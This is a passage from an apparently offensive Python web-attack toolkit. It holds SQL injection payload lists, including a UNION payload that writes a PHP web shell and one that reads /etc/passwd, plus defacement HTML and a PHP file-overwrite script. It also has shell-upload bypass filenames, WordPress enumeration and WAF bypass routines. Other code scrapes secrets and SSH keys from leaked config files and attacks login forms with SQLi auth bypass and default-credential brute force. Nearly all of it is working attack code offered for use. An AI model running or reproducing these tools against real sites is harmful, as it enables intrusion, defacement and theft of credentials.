    {"name": "XML hex", "payload": "&#x27; OR &#x31;=&#x31;"},
    {"name": "XML CDATA", "payload": "<![CDATA[' OR 1=1]]>"},
    # Unicode / charset
    {"name": "Umlaut quote", "payload": "\u2019 OR \u20191\u2019=\u20191"},
    {"name": "Fullwidth quote", "payload": "\uff07 OR 1=1-- -"},
    {"name": "Smart quote", "payload": "\u2018 OR 1=1-- -"},
    {"name": "Fullwidth OR", "payload": "\uff07 \uff2f\uff32 1=1-- -"},
    {"name": "Quote escape", "payload": "\\' OR '1'='1"},
    {"name": "Backslash quote", "payload": "\\\\' OR 1=1-- -"},
    {"name": "Backslash double", "payload": "\\\\\\' OR 1=1-- -"},
    # UNION
    {"name": "UNION ALL", "payload": "' UNION ALL SELECT 1,2,3-- -"},
    {"name": "UNION DISTINCT", "payload": "' UNION DISTINCT SELECT 1,2,3-- -"},
    {"name": "UNION NULLs", "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
    {"name": "UNION with numbers", "payload": "' UNION SELECT 1,2,3,4,5-- -"},
    {"name": "UNION with concat", "payload": "' UNION SELECT 1,CONCAT(user(),0x3a,database()),3-- -"},
    {"name": "UNION with group_concat", "payload": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables-- -"},
    {"name": "UNION newline", "payload": "'\nUNION\nSELECT\n1,2,3-- -"},
    {"name": "UNION comment", "payload": "'/**/UNION/**/SELECT/**/1,2,3/**/--"},
    {"name": "UNION no space", "payload": "'UNION(SELECT(1),(2),(3))-- -"},
    {"name": "UNION parens", "payload": "' UNION (SELECT 1,2,3)-- -"},
    # Stacked
    {"name": "Stacked SELECT", "payload": "'; SELECT 1-- -"},
    {"name": "Stacked DROP", "payload": "'; DROP TABLE tmp-- -"},
    {"name": "Stacked INSERT", "payload": "'; INSERT INTO t VALUES(1)-- -"},
    {"name": "Stacked UPDATE", "payload": "'; UPDATE users SET pass=1-- -"},
    {"name": "Stacked EXEC", "payload": "'; EXEC xp_cmdshell 'whoami'-- -"},
    # Boolean blind
    {"name": "Boolean SUBSTRING", "payload": "' AND SUBSTRING(user(),1,1)='r'-- -"},
    {"name": "Boolean ASCII", "payload": "' AND ASCII(SUBSTRING(user(),1,1))>100-- -"},
    {"name": "Boolean LENGTH", "payload": "' AND LENGTH(database())>3-- -"},
    {"name": "Boolean EXISTS", "payload": "' AND EXISTS(SELECT 1 FROM users)-- -"},
    {"name": "Boolean REGEXP", "payload": "' AND (SELECT 1) REGEXP '1'-- -"},
    # Time blind
    {"name": "Time SLEEP", "payload": "' AND SLEEP(5)-- -"},
    {"name": "Time SLEEP OR", "payload": "' OR SLEEP(5)-- -"},
    {"name": "Time SLEEP parenthesis", "payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"},
    {"name": "Time BENCHMARK", "payload": "' AND BENCHMARK(5000000,MD5(1))-- -"},
    {"name": "Time pg_sleep", "payload": "' AND pg_sleep(5)-- -"},
    {"name": "Time WAITFOR", "payload": "'; WAITFOR DELAY '0:0:5'-- -"},
    {"name": "Time IF SLEEP", "payload": "' AND IF(1=1,SLEEP(5),0)-- -"},
    # Buffer overflow
    {"name": "Long comment", "payload": "' OR '1'='1" + "/*" + "A" * 5000 + "*/-- -"},
    {"name": "Long whitespace", "payload": "' OR '1'='1" + " " * 2000 + "-- -"},
    {"name": "Long A padding", "payload": "' OR '1'='1" + "A" * 10000 + "-- -"},
    {"name": "Long null byte", "payload": "' OR '1'='1" + "%00" * 500},
    {"name": "Long slash comment", "payload": "' OR '1'='1" + "/**/" * 500 + "-- -"},
    # Advanced
    {"name": "Chunked payload", "payload": "' OR '1'='1\r\n0\r\n\r\n"},
    {"name": "Header injection", "payload": "' OR '1'='1%0d%0aX-Injected: 1"},
    {"name": "Cookie injection", "payload": "' OR '1'='1"},
    {"name": "Double URL quote", "payload": "%2527 OR 1=1-- -"},
    {"name": "Base64 wrapped", "payload": "' OR 1=1-- -"},
    {"name": "Reverse slash", "payload": "\\' OR 1=1-- -"},
    {"name": "Multi-line split", "payload": "'\n\t\tOR\t\t1=1\n\t\t--\n"},
]

# ================================================================
# SECTION 8 — UNION SELECT PAYLOADS
# ================================================================

UNION_SELECT_PAYLOADS = {
    "column_null_1": "' UNION SELECT NULL-- -",
    "column_null_2": "' UNION SELECT NULL,NULL-- -",
    "column_null_3": "' UNION SELECT NULL,NULL,NULL-- -",
    "column_null_5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    "column_num_3": "' UNION SELECT 1,2,3-- -",
    "column_num_5": "' UNION SELECT 1,2,3,4,5-- -",
    "order_by_1": "' ORDER BY 1-- -",
    "order_by_5": "' ORDER BY 5-- -",
    "order_by_10": "' ORDER BY 10-- -",
    "user": "' UNION SELECT 1,user(),3-- -",
    "version": "' UNION SELECT 1,version(),3-- -",
    "database": "' UNION SELECT 1,database(),3-- -",
    "current_user": "' UNION SELECT 1,current_user(),3-- -",
    "system_user": "' UNION SELECT 1,system_user(),3-- -",
    "hostname": "' UNION SELECT 1,@@hostname,3-- -",
    "datadir": "' UNION SELECT 1,@@datadir,3-- -",
    "tables": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
    "columns": "' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -",
    "user_pass": "' UNION SELECT 1,GROUP_CONCAT(user,0x3a,password),3 FROM mysql.user-- -",
    "load_file": "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -",
    "into_outfile": "' UNION SELECT 1,'<?php system($_GET[c]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -",
    "pg_version": "' UNION SELECT NULL,version(),NULL-- -",
    "mssql_version": "' UNION SELECT NULL,@@version,NULL-- -",
    "oracle_user": "' UNION SELECT NULL,USER,NULL FROM dual-- -",
    "union_comment": "'/**/UNION/**/SELECT/**/1,2,3-- -",
    "union_versioned": "'/*!50000UNION*//*!50000SELECT*/1,2,3-- -",
    "union_case": "' uNiOn SeLeCt 1,2,3-- -",
    "union_no_space": "'UNION(SELECT(1),(2),(3))-- -",
}

# ================================================================
# SECTION 9 — PATHS / PORTS / WORDLISTS
# ================================================================

ADMIN_PATHS = [
    "/admin", "/administrator", "/adminpanel", "/admin-area", "/admin_area",
    "/adm", "/cp", "/controlpanel", "/dashboard", "/management", "/manage",
    "/panel", "/pages/admin", "/wp-admin", "/admin/login", "/user/login",
    "/login", "/log-in", "/signin", "/sign-in", "/auth", "/authenticate",
    "/backend", "/backoffice", "/webadmin", "/sysadmin", "/secure",
    "/portal", "/cpanel", "/whm", "/directadmin", "/plesk", "/ispconfig",
    "/api/admin", "/swagger", "/cms", "/config", "/setup", "/install",
    "/phpmyadmin", "/pma", "/mysql-admin", "/pgadmin", "/adminer",
    "/admin.php", "/admin.jsp", "/admin.aspx", "/login.php", "/login.jsp",
    "/admin/login.php", "/admin/index.php", "/admin/dashboard.php",
    "/administrator/index.php", "/wp-login.php", "/wp-admin/admin.php",
    "/user/login.php", "/signin.php", "/login.html", "/admin.html",
    "/siteadmin", "/site-admin", "/webmaster", "/superadmin", "/admincp",
    "/filemanager", "/elfinder", "/kcfinder", "/tinyfilemanager",
]

ADMIN_KEYWORDS = ["password", "login", "sign in", "signin", "username",
                  "dashboard", "control panel", "cpanel", "phpmyadmin"]

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 443, 445,
                465, 514, 587, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080,
                8443, 27017, 6379, 11211, 9200, 5000, 8000, 8888, 9000, 9090]

FUZZ_WORDLIST = [
    "admin", "backup", "config", "css", "dev", "files", "images", "includes",
    "js", "lib", "logs", "media", "old", "php", "plugins", "private", "public",
    "scripts", "sql", "src", "test", "tmp", "uploads", "var", "www",
    "wp-content", "wp-includes", "wp-admin", "wp-json", "xmlrpc.php",
    "robots.txt", "sitemap.xml", "backup.zip", "backup.sql", "config.php",
    "index.php", "login.php", "admin.php", "db.php", "settings.php",
    ".env", ".git/config", ".git/HEAD", ".htaccess", "web.config",
]

CONFIG_LEAK_PATHS = [
    "/.env", "/.env.bak", "/.env.old", "/.env.local", "/.env.production",
    "/config.php", "/config.php.bak", "/config.php~", "/config.php.old",
    "/config.inc.php", "/configuration.php", "/configuration.php.bak",
    "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.old",
    "/wp-config.txt", "/.git/config", "/.git/HEAD", "/.svn/entries",
    "/.htaccess", "/.htpasswd", "/web.config", "/backup.sql", "/backup.zip",
    "/backup.tar.gz", "/db.sql", "/database.sql", "/dump.sql", "/site.zip",
    "/www.zip", "/composer.json", "/composer.lock", "/package.json",
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/Dockerfile", "/docker-compose.yml",
    "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
]

# ================================================================
# SECTION 10 — DEFACE PAYLOADS
# ================================================================

DEFACE_HTML = """<!DOCTYPE html>
<html>
<head>
<title>HACKED BY {team}</title>
<style>
body {{ background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px; }}
h1 {{ font-size:72px; text-shadow:0 0 20px #0f0; }}
p {{ font-size:18px; }}
</style>
</head>
<body>
<h1>HACKED</h1>
<p>Owned by <b>{team}</b></p>
<p>{timestamp}</p>
</body>
</html>
"""

PHP_SHELL_DEFACE = """<?php
$payload = base64_decode('{B64}');
foreach([getcwd(), dirname(getcwd()), @$_SERVER['DOCUMENT_ROOT']] as $d){
  foreach(['index.php','index.html','index.htm','default.php','home.php'] as $f){
    @file_put_contents($d.'/'.$f, $payload);
  }
}
echo "DEFACED";
?>"""

UPLOAD_ENDPOINTS = [
    "/wp-admin/async-upload.php", "/wp-admin/media-upload.php",
    "/upload.php", "/upload", "/fileupload.php",
    "/admin/upload.php", "/admin/filemanager/", "/filemanager/",
    "/elfinder/php/connector.php", "/kcfinder/upload.php",
    "/ckfinder/", "/fckeditor/editor/filemanager/",
    "/api/upload", "/api/v1/upload", "/api/files",
    "/images/upload", "/media/upload",
    "/administrator/components/com_media/",
]

UPLOAD_BYPASS_NAMES = [
    "shell.php", "shell.php.jpg", "shell.php.png", "shell.php.gif",
    "shell.php%00.jpg", "shell.pHp", "shell.phtml", "shell.pht",
    "shell.phar", ".htaccess", "shell.php::$DATA",
    "shell.pHp5", "shell.PhP7", "shell.php. .jpg",
]

COMMON_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "admin@123"), ("admin", "root"),
    ("admin", "pass"), ("admin", "letmein"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("administrator", "administrator"), ("administrator", "password"),
    ("test", "test"), ("guest", "guest"), ("user", "user"),
    ("admin", "Admin@123"), ("admin", "P@ssw0rd"), ("admin", "Password1"),
    ("admin", "qwerty"), ("admin", "12345678"), ("admin", "abc123"),
    ("admin", "changeme"), ("admin", "default"),
]

SQL_AUTH_BYPASS = [
    {"username": "admin' -- -", "password": "x"},
    {"username": "admin' #", "password": "x"},
    {"username": "admin'/*", "password": "x"},
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "' OR 1=1-- -", "password": "x"},
    {"username": "admin' OR '1'='1'-- -", "password": "x"},
    {"username": "' UNION SELECT 1,1,1-- -", "password": "x"},
    {"username": "admin", "password": "' OR '1'='1'-- -"},
    {"username": "admin", "password": "admin' -- -"},
    {"username": "administrator' -- -", "password": "x"},
    {"username": "admin", "password": "' OR 1=1 LIMIT 1-- -"},
    {"username": 'admin" -- -', "password": "x"},
    {"username": "admin", "password": 'x" OR "1"="1'},
    {"username": '{"$gt": ""}', "password": '{"$gt": ""}'},
    {"username": '{"$ne": ""}', "password": '{"$ne": ""}'},
]

# ================================================================
# SECTION 11 — WPScan MODULE
# ================================================================

WP_PLUGIN_COMMON = [
    "akismet", "contact-form-7", "wordpress-seo", "woocommerce",
    "jetpack", "wordfence", "elementor", "wpforms-lite",
    "classic-editor", "wp-super-cache", "w3-total-cache",
    "advanced-custom-fields", "duplicator", "updraftplus",
    "wp-file-manager", "ninja-forms", "revslider", "js_composer",
    "essential-grid", "wpbakery", "elementor-pro",
]

WP_THEME_COMMON = [
    "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
    "twentytwentyone", "twentytwenty", "astra", "generatepress",
    "oceanwp", "storefront", "divi", "avada", "betheme",
]

WP_VULN_PLUGINS = {
    "revslider": [("4.1", "CVE-2014-9734", "critical", "Arbitrary file download"),
                  ("4.2", "CVE-2015-1579", "critical", "Arbitrary file download")],
    "wp-file-manager": [("6.0", "CVE-2020-25213", "critical", "Unauthenticated RCE")],
    "duplicator": [("1.3", "CVE-2020-11738", "critical", "Arbitrary file download")],
    "elementor-pro": [("3.0", "CVE-2023-48777", "critical", "Arbitrary file upload")],
    "woocommerce": [("3.", "CVE-2019-9167", "high", "SQLi in product search"),
                    ("5.", "CVE-2021-32789", "medium", "SQLi via orderby")],
    "contact-form-7": [("5.3", "CVE-2020-35489", "high", "Unrestricted file upload")],
    "jetpack": [("9.", "CVE-2020-10739", "critical", "Sensitive data disclosure")],
}


def wp_version_detect(base_url):
    s, h, b = http_get(base_url, timeout=10)
    if b:
        m = re.search(r'<meta name="generator" content="WordPress\s+([0-9.]+)', b)
        if m:
            return m.group(1), "meta"
    s, h, b = http_get(base_url + "/readme.html", timeout=8)
    if s == 200 and b:
        m = re.search(r'Version\s+([0-9.]+)', b)
        if m:
            return m.group(1), "readme"
    s, h, b = http_get(base_url + "/?feed=rss2", timeout=8)
    if b:
        m = re.search(r'<generator>https?://wordpress\.org/\?v=([0-9.]+)', b)
        if m:
            return m.group(1), "feed"
    return None, None


def wp_user_enum(base_url):
    users = []
    s, h, b = http_get(base_url + "/wp-json/wp/v2/users", timeout=10)
    if s == 200 and b:
        try:
            for u in json.loads(b):
                if "slug" in u:
                    users.append({"slug": u["slug"], "name": u.get("name", ""),
                                  "id": u.get("id"), "email": u.get("email", "")})
        except Exception:
            pass
    if not users:
        for i in range(1, 6):
            s, h, b = http_get(base_url + f"/?author={i}", timeout=6)
            if s == 200 and b:
                m = re.search(r'/author/([a-z0-9_-]+)/', b)
                if m:
                    users.append({"slug": m.group(1), "id": i})
            else:
                break
    return users


def wp_plugin_enum(base_url):
    found = []
    s, h, b = http_get(base_url, timeout=10)
    if b:
        for m in re.finditer(r'/wp-content/plugins/([a-z0-9_-]+)/', b, re.I):
            slug = m.group(1).lower()
            if slug not in [f["slug"] for f in found]:
                found.append({"slug": slug, "version": None, "source": "html"})
    for plugin in WP_PLUGIN_COMMON:
        if any(f["slug"] == plugin for f in found):
            continue
        s, h, b = http_get(base_url + f"/wp-content/plugins/{plugin}/readme.txt", timeout=5)
        if s == 200 and b and ("stable tag" in b.lower() or "== description ==" in b.lower()):
            m = re.search(r'Stable tag:\s*([0-9.]+)', b, re.I)
            found.append({"slug": plugin, "version": m.group(1) if m else None, "source": "readme"})
    return found


def wp_theme_enum(base_url):
    found = []
    s, h, b = http_get(base_url, timeout=10)
    if b:
        for m in re.finditer(r'/wp-content/themes/([a-z0-9_-]+)/', b, re.I):
            slug = m.group(1).lower()
            if slug not in [f["slug"] for f in found]:
                found.append({"slug": slug, "version": None})
    for theme in WP_THEME_COMMON:
        if any(f["slug"] == theme for f in found):
            continue
        s, h, b = http_get(base_url + f"/wp-content/themes/{theme}/style.css", timeout=5)
        if s == 200 and b and "theme name" in b.lower():
            m = re.search(r'Version:\s*([0-9.]+)', b, re.I)
            found.append({"slug": theme, "version": m.group(1) if m else None})
    return found


def wp_cve_match(version, plugins):
    findings = []
    if version:
        for prefix, cves in CVE_DB.get("WordPress", {}).items():
            if version.startswith(prefix):
                for cve, sev, desc in cves:
                    findings.append(("WordPress", version, cve, sev, desc))
    for p in plugins:
        if p["slug"] in WP_VULN_PLUGINS and p["version"]:
            for prefix, cve, sev, desc in WP_VULN_PLUGINS[p["slug"]]:
                if p["version"].startswith(prefix):
                    findings.append((f"plugin:{p['slug']}", p["version"], cve, sev, desc))
    return findings


def wpscan(url):
    print_section(" WordPress Scanner ")
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    prime_baseline(url)

    s, h, b = http_get(base, timeout=10)
    if not b or ("wp-content" not in b and "wp-includes" not in b):
        print_warn("Not WordPress")
        return None

    result = {"url": base, "version": None, "users": [], "plugins": [],
              "themes": [], "cves": [], "issues": []}

    ver, src = wp_version_detect(base)
    if ver:
        result["version"] = ver
        print_good(f"WordPress {ver} (via {src})")
    else:
        print_info("Version hidden")

    print_info("Users...")
    users = wp_user_enum(base)
    result["users"] = users
    for u in users:
        print_good(f"User: {u.get('slug')} (ID {u.get('id')})")

    print_info("Plugins...")
    plugins = wp_plugin_enum(base)
    result["plugins"] = plugins
    for pl in plugins:
        print_good(f"Plugin: {pl['slug']}" + (f" v{pl['version']}" if pl['version'] else ""))

    print_info("Themes...")
    themes = wp_theme_enum(base)
    result["themes"] = themes
    for t in themes:
        print_good(f"Theme: {t['slug']}" + (f" v{t['version']}" if t['version'] else ""))

    s, h, b = http_get(base + "/xmlrpc.php", timeout=8)
    if s == 405 or (s == 200 and "XML-RPC server accepts POST requests only" in (b or "")):
        print_warn("XML-RPC enabled")
        result["issues"].append("XML-RPC enabled")

    cves = wp_cve_match(ver, plugins)
    result["cves"] = cves
    for product, v, cve, sev, desc in cves:
        color = RED if sev == "critical" else (YELLOW if sev == "high" else CYAN)
        print(f"{color}[{sev.upper()}]{NC} {product} {v} → {cve}: {desc}")

    return result

# ================================================================
# SECTION 12 — CVE SCANNER
# ================================================================

def cve_scan(url):
    print_section(" CVE Scanner ")
    prime_baseline(url)
    versions = {}
    s, h, b = http_get(url, timeout=10)

    if h:
        server = h.get("Server", "")
        for product in ["Apache", "nginx", "OpenSSH", "PHP", "LiteSpeed", "IIS", "Tomcat"]:
            m = re.search(rf"{product}/([0-9.]+)", server, re.I)
            if m:
                versions[product] = m.group(1)
                print_info(f"{product} {m.group(1)}")
        xpb = h.get("X-Powered-By", "")
        for product in ["PHP", "ASP.NET", "Express"]:
            m = re.search(rf"{product}/([0-9.]+)", xpb, re.I)
            if m:
                versions[product] = m.group(1)
                print_info(f"{product} {m.group(1)}")

    if b:
        for m in re.finditer(r'jquery[.-]?v?([0-9.]+)(?:\.min)?\.js', b, re.I):
            versions["jQuery"] = m.group(1)
            print_info(f"jQuery {m.group(1)}")
        for m in re.finditer(r'bootstrap[.-]?v?([0-9.]+)(?:\.min)?\.(?:js|css)', b, re.I):
            versions["Bootstrap"] = m.group(1)
            print_info(f"Bootstrap {m.group(1)}")

    findings = []
    for product, version in versions.items():
        if product not in CVE_DB:
            continue
        for vprefix, cves in CVE_DB[product].items():
            if version.startswith(vprefix):
                for cve, sev, desc in cves:
                    findings.append((product, version, cve, sev, desc))
                    color = RED if sev == "critical" else (YELLOW if sev == "high" else CYAN)
                    print(f"{color}[{sev.upper()}]{NC} {product} {version} → {cve}: {desc}")

    if not findings:
        print_info("No CVE matches")
    return findings

# ================================================================
# SECTION 13 — WAF DETECT + BYPASS
# ================================================================

def detect_waf(url):
    print_section(" WAF Detection ")
    detected = []
    s, h, b = http_get(url, timeout=12)
    if s is None:
        print_error("Unreachable")
        RESULTS.add_error("WAF check failed: unreachable")
        return None

    h_l = {k.lower(): v for k, v in (h or {}).items()}
    body_l = (b or "").lower()
    server_hdr = h_l.get("server", "").lower()

    for name, sigs in WAF_SIGNATURES.items():
        matched = False
        for hk in sigs["headers"]:
            hk_l = hk.lower()
            if ":" in hk_l:
                key, val = hk_l.split(":", 1)
                if key.strip() == "server" and val.strip() in server_hdr:
                    matched = True
                    break
            elif hk_l in h_l:
                matched = True
                break
        if not matched:
            for bp in sigs["body"]:
                if bp.lower() in body_l:
                    matched = True
                    break
        if matched:
            detected.append(name)
            print_good(f"WAF: {name}")

    probe = url + ("?" if "?" not in url else "&") + f"x={BASELINE_TOKEN}' UNION SELECT NULL--"
    s2, _, _ = http_get(probe, timeout=8)
    if s2 in (403, 406, 429, 503) and not detected:
        detected.append(f"Unknown WAF (HTTP {s2})")
        print_good(detected[-1])

    if not detected:
        print_info("No WAF detected")
        RESULTS.data["waf"]["detected"] = []
        return None
    RESULTS.data["waf"]["detected"] = detected
    return detected


def test_bypass_header(url, param, header_dict, payload="' OR '1'='1"):
    base_url = url.split("?")[0]
    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
    hh = {"User-Agent": rand_ua()}
    hh.update(header_dict)
    s, h, b = http_get(test_url, timeout=8, headers=hh)
    if s is None or s in (403, 406, 429, 503, 500):
        return False
    for pat in SQL_ERROR_PATTERNS:
        if re.search(pat, b or "", re.I):
            return True
    if s == 200 and b and len(b) > 100:
        bl = b.lower()
        if not any(m in bl for m in ["access denied", "blocked", "forbidden"]):
            return True
    return False


def auto_waf_bypass(url):
    print_section(" Auto WAF Bypass ")
    if "?" not in url:
        print_warn("No parameters")
        return False, None
    base_url = url.split("?")[0]
    params = [p.split("=")[0] for p in url.split("?")[1].split("&") if p]

    waf = detect_waf(url)
    if not waf:
        return True, "No WAF"
    print_info(f"WAF: {', '.join(waf)}")

    print_info(f"Phase 1: Header bypass ({len(WAF_BYPASS_HEADERS)} tests)...")
    for bh in WAF_BYPASS_HEADERS:
        for param in params:
            if test_bypass_header(url, param, bh):
                method = f"Header: {list(bh.keys())[0]}={list(bh.values())[0]}"
                print_good(f"Bypass: {method}")
                RESULTS.data["waf"]["bypass_method"] = method
                RESULTS.data["waf"]["bypassed"] = True
                return True, method

    print_info(f"Phase 2: Payload bypass ({len(WAF_BYPASS_TECHNIQUES_SQL)} techniques)...")
    for tech in WAF_BYPASS_TECHNIQUES_SQL:
        for param in params:
            if tech["name"] == "HPP":
                test_url = f"{base_url}?{tech['payload']}&{param}=1"
                s, h, b = http_get(test_url, timeout=8)
            else:
                test_url = f"{base_url}?{param}={urllib.parse.quote(tech['payload'])}"
                s, h, b = http_get(test_url, timeout=8)
            if s is None or s in (403, 406, 429, 503, 500):
                continue
            for pat in SQL_ERROR_PATTERNS:
                if re.search(pat, b or "", re.I):
                    print_good(f"Bypass: {tech['name']}")
                    RESULTS.data["waf"]["bypass_method"] = tech["name"]
                    RESULTS.data["waf"]["bypassed"] = True
                    return True, tech["name"]
            if s == 200 and b and len(b) > 200:
                bl = b.lower()
                if not any(m in bl for m in ["access denied", "blocked", "forbidden"]):
                    print_good(f"Bypass (soft): {tech['name']}")
                    RESULTS.data["waf"]["bypass_method"] = tech["name"]
                    RESULTS.data["waf"]["bypassed"] = True
                    return True, tech["name"]

    print_info("Phase 3: User-Agent rotation...")
    for ua in random.sample(UA_POOL, min(len(UA_POOL), 8)):
        for param in params:
            test_url = f"{base_url}?{param}=" + urllib.parse.quote("' UNION SELECT 1,2,3-- -")
            s, h, b = http_get(test_url, timeout=8, headers={"User-Agent": ua})
            if s == 200 and b:
                for pat in SQL_ERROR_PATTERNS:
                    if re.search(pat, b, re.I):
                        print_good(f"Bypass: UA rotation")
                        RESULTS.data["waf"]["bypass_method"] = "UA rotation"
                        RESULTS.data["waf"]["bypassed"] = True
                        return True, "UA rotation"

    print_warn("All bypass techniques failed")
    return False, None

# ================================================================
# SECTION 14 — CONFIG LEAK
# ================================================================

def find_config_leaks(url):
    print_section(" Config / Backup Leaks ")
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    prime_baseline(url)
    leaks = []
    lock = threading.Lock()

    def check(path):
        test = base + path
        s, h, b = http_get(test, timeout=6, allow_redirects=False)
        if s != 200:
            return
        if not is_real_hit(base, s, b):
            return
        if len(b or "") < 30:
            return
        with lock:
            leaks.append((test, len(b)))
            print_hit(f"{test} ({len(b)} bytes)")
            RESULTS.note(f"Config leak: {test} ({len(b)} bytes)")
        if any(x in path for x in [".env", "config", "wp-config", "credentials", "id_rsa"]):
            for m in re.finditer(r'^([A-Z_][A-Z0-9_]{2,})\s*=\s*["\']?([^\s"\']+)', b or "", re.M):
                k, v = m.group(1), m.group(2)
                if any(x in k.upper() for x in ["PASS", "PWD", "SECRET", "TOKEN", "KEY", "USER", "DB_", "AWS_"]):
                    print_warn(f"   → {k}={v[:50]}")
                    RESULTS.note(f"   → {k}={v[:50]}")
            if "BEGIN RSA PRIVATE KEY" in (b or "") or "BEGIN OPENSSH PRIVATE KEY" in (b or ""):
                print_hit(f"   → SSH KEY at {test}")
                RESULTS.note(f"   → SSH KEY at {test}")

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(check, CONFIG_LEAK_PATHS))

    if not leaks:
        print_info("No leaks found")
    RESULTS.data["config_leaks"] = leaks
    return leaks

# ================================================================
# SECTION 15 — ADMIN FINDER + AUTH ATTACK
# ================================================================

def find_admin_panel(url):
    print_section(" Admin Panel Finder ")
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    prime_baseline(url)
    hits = []
    lock = threading.Lock()

    def check(path):
        test = base + path
        s, h, b = http_get(test, timeout=6, allow_redirects=False)
        if s is None:
            return
        if s in (301, 302, 303, 307, 308):
            loc = h.get("Location", "")
            if any(k in loc.lower() for k in ["login", "admin", "dashboard", "auth", "signin"]):
                with lock:
                    hits.append((test, s, f"redirect → {loc}"))
                    print_hit(f"REDIRECT: {test} → {loc}")
            return
        if s == 200:
            if not is_real_hit(base, s, b):
                return
            bl = (b or "").lower()
            if any(k in bl for k in ADMIN_KEYWORDS) and ("<form" in bl or "<input" in bl):
                with lock:
                    hits.append((test, s, "login-form"))
                    print_hit(f"LOGIN: {test}")
        elif s == 401 and "WWW-Authenticate" in h:
            with lock:
                hits.append((test, s, "HTTP Basic"))
                print_hit(f"AUTH: {test}")

    with ThreadPoolExecutor(max_workers=20) as ex:
        list(ex.map(check, ADMIN_PATHS))

    if not hits:
        print_info("No admin panels found")
    RESULTS.data["admin_panels"] = hits
    return hits


def find_login_form(url):
    s, h, b = http_get(url, timeout=10)
    if not b:
        return None
    soup = BeautifulSoup(b, "html.parser")
    for form in soup.find_all("form"):
        inputs = form.find_all("input")
        if any(i.get("type") == "password" for i in inputs):
            action = form.get("action") or url
            action_url = urllib.parse.urljoin(url, action)
            method = (form.get("method") or "post").lower()
            fields = {}
            for i in inputs:
                name = i.get("name")
                if name:
                    fields[name] = i.get("value", "")
            return {"action": action_url, "method": method, "fields": fields}
    return None


def detect_login_fields(form):
    uf = ["user", "username", "email", "login", "name", "uname"]
    pf = ["pass", "password", "passwd", "pwd"]
    u = p = None
    for f in form["fields"]:
        fl = f.lower()
        if any(x in fl for x in uf) and not u:
            u = f
        if any(x in fl for x in pf) and not p:
            p = f
    if not u:
        u = list(form["fields"].keys())[0] if form["fields"] else "username"
    if not p:
        for f in form["fields"]:
            if f != u:
                p = f
                break
        if not p:
            p = "password"
    return u, p


def try_login(form, username, password):
    u_field, p_field = detect_login_fields(form)
    data = dict(form["fields"])
    data[u_field] = username
    data[p_field] = password
    if form["method"] == "post":
        return http_post(form["action"], data, timeout=10)
    q = urllib.parse.urlencode(data)
    return http_get(form["action"] + "?" + q, timeout=10)


def attack_login(login_url):
    print_section(f" Auth Attack — {login_url} ")
    form = find_login_form(login_url)
    if not form:
        print_warn("No login form")
        return None
    print_info(f"Action: {form['action']} ({form['method'].upper()})")

    u_field, p_field = detect_login_fields(form)
    print_info(f"Username field: {u_field}   Password field: {p_field}")

    s0, _, b0 = try_login(form, "", "")
    if s0 is None:
        print_error("Unreachable")
        return None
    base_hash = body_hash(b0)

    print_info("SQL bypass...")
    for payload in SQL_AUTH_BYPASS:
        s, h, b = try_login(form, payload["username"], payload["password"])
        if s is None:
            continue
        success = False
        redirect = None
        if s in (301, 302, 303, 307, 308):
            loc = h.get("Location", "")
            if not any(x in loc.lower() for x in ["login", "error", "fail"]):
                success = True
                redirect = loc
        elif s == 200 and body_hash(b) != base_hash:
            bl = (b or "").lower()
            if any(k in bl for k in ["dashboard", "logout", "welcome"]) and \
               not any(k in bl for k in ["invalid", "incorrect", "failed"]):
                success = True

        if success:
            cred = {
                "type": "SQL",
                "username": payload["username"],
                "password": payload["password"],
                "email": payload["username"],
                "login_url": login_url,
                "redirect": redirect,
                "field_user": u_field,
                "field_pass": p_field,
            }
            print(f"\n{MAGENTA}{'='*72}{NC}")
            print(f"{MAGENTA}[★] AUTH BYPASS SUCCESSFUL{NC}")
            print(f"{MAGENTA}{'='*72}{NC}")
            print(f"  {BOLD}Login URL:{NC}  {login_url}")
            print(f"  {BOLD}Method:{NC}     {form['method'].upper()}")
            print(f"  {BOLD}Username:{NC}   {payload['username']}")
            print(f"  {BOLD}Password:{NC}   {payload['password']}")
            print(f"  {BOLD}Email:{NC}      {payload['username']}")
            if redirect:
                print(f"  {BOLD}Redirect:{NC}   {redirect}")
            print(f"  {BOLD}Type:{NC}       SQL Injection")
            print(f"{MAGENTA}{'='*72}{NC}\n")
            RESULTS.data["auth_bypass"] = cred
            RESULTS.note(f"AUTH BYPASS — {login_url} — user={payload['username']} pass={payload['password']}")
            return cred

    print_info(f"Brute ({len(COMMON_CREDS)} creds)...")
    for user, pw in COMMON_CREDS:
        s, h, b = try_login(form, user, pw)
        if s is None:
            continue
        success = False
        redirect = None
        if s in (301, 302, 303, 307, 308):
            loc = h.get("Location", "")
            if not any(x in loc.lower() for x in ["login", "error", "fail"]):
                success = True
                redirect = loc
        elif s == 200 and body_hash(b) != base_hash:
            bl = (b or "").lower()
            if any(k in bl for k in ["dashboard", "logout", "welcome"]) and \
               not any(k in bl for k in ["invalid", "incorrect", "failed"]):
                success = True

        if success:
            email_field = None
            for f in form["fields"]:
